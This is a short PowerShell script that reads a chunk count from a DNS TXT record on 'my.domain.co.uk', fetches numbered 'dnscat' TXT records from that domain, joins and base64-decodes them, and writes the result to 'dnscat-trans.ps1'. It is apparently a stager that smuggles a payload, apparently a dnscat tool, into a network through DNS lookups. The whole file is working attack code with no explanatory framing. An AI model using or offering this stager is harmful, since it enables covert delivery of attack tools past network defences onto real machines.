$d="my.domain.co.uk"
$dr=(Resolve-DnsName -Name "dnscatcount.$d" -Type txt).Strings
$c=[convert]::ToInt32($dr,10)
$o=@()
for ($i=1;$i -le $c;$i++)
{
    $n="dnscat" + $i.toString() + ".$d"
	$o+=(Resolve-DnsName -Name $n -Type txt).Strings
}
$b64=-join $o
[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($b64)) | Add-Content "dnscat-trans.ps1"